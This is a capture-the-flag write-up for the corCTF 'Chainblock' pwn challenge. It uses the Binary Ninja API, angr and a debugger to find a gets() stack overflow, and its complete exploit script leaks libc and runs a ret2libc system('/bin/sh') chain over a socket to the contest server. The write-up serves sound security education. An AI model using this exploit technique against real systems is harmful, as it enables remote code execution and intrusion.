---
layout: post
author: playoff-rondo
title:  "corCTF: Chainblock"
date:   2021-08-31 1:01:37 -0500
categories: CTF-writeup
ctf-category: PWN
---

This was a simple challenge that doesn't really need a writeup, however I am addicted to Binaryninja so maybe I can get a free license out of this.

## Update
This writeup ended up winning the best use of binaryninja and netted me a free license
![win](/assets/chainblock/win.png

# Understanding the Challenge
We were given the binary and source of the challenge as well as the interpreter and libc, however I decided not to look at the source or open the binary in a disassembler. A teammate had mentioned that there was a `gets` call in the binary, so I decided to write a solve script with this information.

# Writing the solve script
To win the binja license I have to use binja for this writeup. Since I don't want to open the binary in binja though, I'll have to use binja api and solve this headlessly.

## Mitigations
I used the checksec commandline tool to print mitigations enabled.
```
[*] '/home/chris/Desktop/cor/chain/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'
```

With no canary and no pie, ropping should be easy.

## Locating the vuln

Using the hint that there is a call to `gets`, I used binja to find where the `gets` is being called and grab the `hlil` of that function call.

```py
from binaryninja import BinaryViewType
binary_path = "./chainblock"

bv = BinaryViewType.get_view_of_file(binary_path)

gets_function = bv.get_functions_by_name("gets")[0]

for ref in bv.get_code_refs(gets_function.start):
    hlil = ref.function.get_low_level_il_at(ref.address).hlil
```

With the `hlil`, we can determine if the parameter being passed into the `gets` call is on the stack. If so we have a potential stack-based buffer overflow.

The following code finds that the parameter of the `gets` call is on the stack and prints the stack offset of the variable.

```py
from binaryninja import BinaryViewType, HighLevelILOperation, RegisterValueType
binary_path = "./chainblock"


bv = BinaryViewType.get_view_of_file(binary_path)

gets_function = bv.get_functions_by_name("gets")[0]

def get_vuln(b):
    for ref in b.get_code_refs(gets_function.start):
        hlil = ref.function.get_low_level_il_at(ref.address).hlil
        if hlil.operation == HighLevelILOperation.HLIL_CALL:
            param = hlil.params[0]
            if param.operation == HighLevelILOperation.HLIL_ADDRESS_OF:
                val = param.value
                if val.type == RegisterValueType.StackFrameOffset:
                    offset = val.offset
                    return hlil,offset

hlil,offset = get_vuln(bv)
print(f"Stack-Based Buffer Overflow Detected. Supplying {abs(offset)} bytes shold corrupt base pointer!")
print(f"HLIL: {hex(hlil.address)}->", str(hlil))

```

Output:
```
Stack-Based Buffer Overflow Detected. Supplying 264 bytes shold corrupt base pointer!
HLIL: 0x4011e5-> gets(&var_108)
```

For us to gain code execution we have to overwrite the saved return pointer on the stack and reach a ret instruction to pop our bytes into rip.

```py
sf = hlil.function.source_function
last_instruction = sf.get_low_level_il_at(sf.address_ranges[0].end-1).hlil
if last_instruction.operation == HighLevelILOperation.HLIL_RET:
    end_addr = last_instruction.address
```

## Reaching the vuln
Now that we know there is a potential stack based buffer overflow, I then used `angr` to see if this bad code is reachable from main.

```py
proj = angr.Project(binary_path)
main = bv.get_functions_by_name("main")[0]
state = proj.factory.blank_state(addr=main.start)
simgr = proj.factory.simgr(state)
simgr.explore(find=hlil.address)

if len(simgr.found) > 0:
    print("Vuln gets is reachable!")
    print("The following input is required to reach vuln:",simgr.found[0].posix.dumps(0))
```
Output:
```
Stack-Based Buffer Overflow Detected. Supplying 264 bytes shold corrupt base pointer!
HLIL: 0x4011e5-> gets(&var_108)
WARNING | 2021-08-31 13:37:48,840 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.
WARNING | 2021-08-31 13:37:48,841 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING | 2021-08-31 13:37:48,841 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING | 2021-08-31 13:37:48,841 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null
WARNING | 2021-08-31 13:37:48,841 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING | 2021-08-31 13:37:48,841 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x40124f (main+0x4 in chainblock (0x40124f))
Vuln gets is reachable!
The following input is required to reach vuln: b''
```

So we don't have to send any specific input to reach the vulnerable `gets` call.

## Triggering the vuln
We can use `angr` to now trace from the `gets` call to the `ret` to make sure we still can reach the `ret` of the vuln function so that our corrupted saved rip can be used.

```py
simgr = proj.factory.simgr(simgr.found[0])
simgr.explore(find=end_addr)
if len(simgr.found) > 0:
    print("Can reach ret")
```

Binja has a debugger that is a work in progress. I used this to concretely run the binary to confirm we can corrupt rip. 

Because the debugger is unfinished, I run the debugger up to the `gets` then store my payload on the stack and skip the call to simulate  `gets`.  Then catch if there is an memory access violation (when trying to set rip to "BBBBBBBB"). Then double check to make sure that RIP would be correctly overwritten with the "B"s.

```py
from Vector35_debugger import gdb
adapter = gdb.DebugAdapterGdb()
adapter.exec(binary_path)

payload  = b""
payload += b"A"*abs(offset)
payload += b"B"*8

adapter.breakpoint_set(hlil.address)
adapter.go()
adapter.breakpoint_clear(hlil.address)

buff = adapter.reg_read('rdi')
adapter.mem_write(buff,payload)
next_instruction = bv.get_instruction_length(hlil.address) + hlil.address
adapter.reg_write("rip",next_instruction)
reason,_ = adapter.go()
adapter.handle_stop(reason,_)

if reason == gdb.DebugAdapter.STOP_REASON.ACCESS_VIOLATION:
    rip = adapter.mem_read(adapter.reg_read("rsp"),8)
    if rip == b"B"*8:
        print("RIP IS SUCCESSFULLY OVERWRITEN")
```

Running this confirms corruption of the saved rip as well as the correct payload size.

## Exploitation
To exploit, I leaked libc and called `system(/bin/sh)`

I started with a few helper functions to pack and unpack as well as some poorly coded socket functions. In additon to them,  used binja api to make a dictionary of the plt and got.
```py
p64 = lambda x: struct.pack("<Q",x)
u64 = lambda x: struct.unpack("<Q",x.ljust(8,b"\x00"))[0]

def read_info():
    for _ in range(stdout_len):
        io.recv(1)

def readline(end=b"\n"):
    found_newline = False
    line = b""
    while not found_newline:
        r = io.recv(1)
        line+=r
        if r == end:
            found_newline = True
    return line
got = {x.name:x.address for x in bv.get_symbols_of_type(SymbolType.ImportAddressSymbol)}
plt = {x.name:x.address for x in bv.get_symbols_of_type(SymbolType.ImportedFunctionSymbol)}
```
The one gadget we have to search for is a `pop rdi`. Typically, I've noticed thats not found in small binaries, however there is always a `pop r15` in `__libc_csu_init`. Adding 1 to a `pop 15` gets us a `pop rdi`.

Binja can search for gadgets, I did it in the LLIL:
```py
pop_rdi = bv.find_next_text(bv.start,"r15 = pop",graph_type=FunctionGraphType.LowLevelILFunctionGraph)+1
ret = pop_rdi + 1
```

Then make the socket connection:
```py
host,port = "pwn.be.ax",5000
io = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
io.connect((host,port))
```
And build the payload to get a leak:
```py
payload  = b""
payload += b"A"*abs(offset)
payload += p64(pop_rdi)
payload += p64(got['puts'])
payload += p64(plt['puts'])
payload += p64(main.start)

read_info()
io.send(payload+b"\n")
readline()
puts_leak = u64(io.recv(6))
print("Puts:", hex(puts_leak))
```

With a leak, we can load up libc and rebase and then find the string "/bin/sh":
```py
libc = BinaryViewType.get_view_of_file("./libc.so.6",update_analysis=False)
libc = libc.rebase(puts_leak - libc.symbols['puts'][0].address,force=True)
print("Libc Base:", hex(libc.start))

bin_sh = libc.find_next_data(libc.start,"/bin/sh")
```
 Lastly, send a ret2libc payload with an extra ret because of the `movaps` issue.
 ```py
 payload2  = b""
payload2 += b"A"*abs(offset)
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols['system'][0].address)

io.send(payload2+b"\n")
io.send(b"cat flag.txt\n")
readline()
print(readline(b"}"))
```
# Final Payload
```py
from binaryninja import BinaryViewType, HighLevelILOperation, RegisterValueType, SymbolType, FunctionGraphType
import angr
import struct
import socket

binary_path = "./chainblock"
bv = BinaryViewType.get_view_of_file(binary_path)

gets_function = bv.get_functions_by_name("gets")[0]

# LOCATING THE VULN
def get_vuln(b):
    for ref in b.get_code_refs(gets_function.start):
        hlil = ref.function.get_low_level_il_at(ref.address).hlil
        if hlil.operation == HighLevelILOperation.HLIL_CALL:
            param = hlil.params[0]
            if param.operation == HighLevelILOperation.HLIL_ADDRESS_OF:
                val = param.value
                if val.type == RegisterValueType.StackFrameOffset:
                    offset = val.offset
                    return hlil,offset

hlil,offset = get_vuln(bv)
print(f"Stack-Based Buffer Overflow Detected. Supplying {abs(offset)} bytes shold corrupt base pointer!")
print(f"HLIL: {hex(hlil.address)}->", str(hlil))

sf = hlil.function.source_function
last_instruction = sf.get_low_level_il_at(sf.address_ranges[0].end-1).hlil
if last_instruction.operation == HighLevelILOperation.HLIL_RET:
    end_addr = last_instruction.address

# REACHING THE VULN
proj = angr.Project(binary_path)
main = bv.get_functions_by_name("main")[0]
state = proj.factory.blank_state(addr=main.start)
simgr = proj.factory.simgr(state)
simgr.explore(find=hlil.address)

if len(simgr.found) > 0:
    print("Vuln gets is reachable!")
    print("The following input is required to reach vuln:",simgr.found[0].posix.dumps(0))

stdout_len = len(simgr.found[0].posix.dumps(1))

# TRIGGERING THE VULN
simgr = proj.factory.simgr(simgr.found[0])
simgr.explore(find=end_addr)
if len(simgr.found) > 0:
    print("Can reach ret")

from Vector35_debugger import gdb
adapter = gdb.DebugAdapterGdb()
adapter.exec(binary_path)

payload  = b""
payload += b"A"*abs(offset)
payload += b"B"*8

adapter.breakpoint_set(hlil.address)
adapter.go()
adapter.breakpoint_clear(hlil.address)

buff = adapter.reg_read('rdi')
adapter.mem_write(buff,payload)
next_instruction = bv.get_instruction_length(hlil.address) + hlil.address
adapter.reg_write("rip",next_instruction)
reason,_ = adapter.go()
adapter.handle_stop(reason,_)

if reason == gdb.DebugAdapter.STOP_REASON.ACCESS_VIOLATION:
    rip = adapter.mem_read(adapter.reg_read("rsp"),8)
    if rip == b"B"*8:
        print("RIP IS SUCCESSFULLY OVERWRITEN")

# EXPLOITATION
p64 = lambda x: struct.pack("<Q",x)
u64 = lambda x: struct.unpack("<Q",x.ljust(8,b"\x00"))[0]

def read_info():
    for _ in range(stdout_len):
        io.recv(1)

def readline(end=b"\n"):
    found_newline = False
    line = b""
    while not found_newline:
        r = io.recv(1)
        line+=r
        if r == end:
            found_newline = True
    return line
got = {x.name:x.address for x in bv.get_symbols_of_type(SymbolType.ImportAddressSymbol)}
plt = {x.name:x.address for x in bv.get_symbols_of_type(SymbolType.ImportedFunctionSymbol)}

pop_rdi = bv.find_next_text(bv.start,"r15 = pop",graph_type=FunctionGraphType.LowLevelILFunctionGraph)+1
ret = pop_rdi + 1

host,port = "pwn.be.ax",5000
io = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
io.connect((host,port))

payload  = b""
payload += b"A"*abs(offset)
payload += p64(pop_rdi)
payload += p64(got['puts'])
payload += p64(plt['puts'])
payload += p64(main.start)

read_info()
io.send(payload+b"\n")
readline()
puts_leak = u64(io.recv(6))
print("Puts:", hex(puts_leak))

libc = BinaryViewType.get_view_of_file("./libc.so.6",update_analysis=False)
libc = libc.rebase(puts_leak - libc.symbols['puts'][0].address,force=True)
print("Libc Base:", hex(libc.start))

bin_sh = libc.find_next_data(libc.start,"/bin/sh")

io.recv(1)
read_info()

payload2  = b""
payload2 += b"A"*abs(offset)
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols['system'][0].address)

io.send(payload2+b"\n")
io.send(b"cat flag.txt\n")
readline()
print(readline(b"}"))
```

Output:
```
Stack-Based Buffer Overflow Detected. Supplying 264 bytes shold corrupt base pointer!
HLIL: 0x4011e5-> gets(&var_108)
WARNING | 2021-08-31 15:58:34,438 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.
WARNING | 2021-08-31 15:58:34,439 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING | 2021-08-31 15:58:34,439 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING | 2021-08-31 15:58:34,439 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null
WARNING | 2021-08-31 15:58:34,439 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING | 2021-08-31 15:58:34,439 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x40124f (main+0x4 in chainblock (0x40124f))
Vuln gets is reachable!
The following input is required to reach vuln: b''
WARNING | 2021-08-31 15:58:35,096 | angr.procedures.libc.gets | The use of gets in a program usually causes buffer overflows. You may want to adjust SimStateLibc.max_gets_size to properly mimic an overflowing read.
Can reach ret
Process ./chainblock created; pid = 1414641
Listening on port 31337
Remote debugging from host ::ffff:127.0.0.1, port 48580
      ___           ___           ___                       ___     
     /\  \         /\__\         /\  \          ___        /\__\    
    /::\  \       /:/  /        /::\  \        /\  \      /::|  |   
   /:/\:\  \     /:/__/        /:/\:\  \       \:\  \    /:|:|  |   
  /:/  \:\  \   /::\  \ ___   /::\~\:\  \      /::\__\  /:/|:|  |__ 
 /:/__/ \:\__\ /:/\:\  /\__\ /:/\:\ \:\__\  __/:/\/__/ /:/ |:| /\__\
 \:\  \  \/__/ \/__\:\/:/  / \/__\:\/:/  / /\/:/  /    \/__|:|/:/  /
  \:\  \            \::/  /       \::/  /  \::/__/         |:/:/  / 
   \:\  \           /:/  /        /:/  /    \:\__\         |::/  /  
    \:\__\         /:/  /        /:/  /      \/__/         /:/  /   
     \/__/         \/__/         \/__/                     \/__/    
      ___           ___       ___           ___           ___     
     /\  \         /\__\     /\  \         /\  \         /\__\    
    /::\  \       /:/  /    /::\  \       /::\  \       /:/  /    
   /:/\:\  \     /:/  /    /:/\:\  \     /:/\:\  \     /:/__/     
  /::\~\:\__\   /:/  /    /:/  \:\  \   /:/  \:\  \   /::\__\____ 
 /:/\:\ \:|__| /:/__/    /:/__/ \:\__\ /:/__/ \:\__\ /:/\:::::\__\
 \:\~\:\/:/  / \:\  \    \:\  \ /:/  / \:\  \  \/__/ \/_|:|~~|~   
  \:\ \::/  /   \:\  \    \:\  /:/  /   \:\  \          |:|  |    
   \:\/:/  /     \:\  \    \:\/:/  /     \:\  \         |:|  |    
    \::/__/       \:\__\    \::/  /       \:\__\        |:|  |    
     ~~            \/__/     \/__/         \/__/         \|__|    


----------------------------------------------------------------------------------

Welcome to Chainblock, the world's most advanced chain of blocks.

Chainblock is a unique company that combines cutting edge cloud
technologies with high tech AI powered machine learning models
to create a unique chain of blocks that learns by itself!

Chainblock is also a highly secure platform that is unhackable by design.
We use advanced technologies like NX bits and anti-hacking machine learning models
to ensure that your money is safe and will always be safe!

----------------------------------------------------------------------------------

For security reasons we require that you verify your identity.
Please enter your name: KYC failed, wrong identity!
RIP IS SUCCESSFULLY OVERWRITEN
Puts: 0x7f12cd12a9d0
Libc Base: 0x7f12cd0aa000
b'corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}'
Killing process(es): 1414641
```
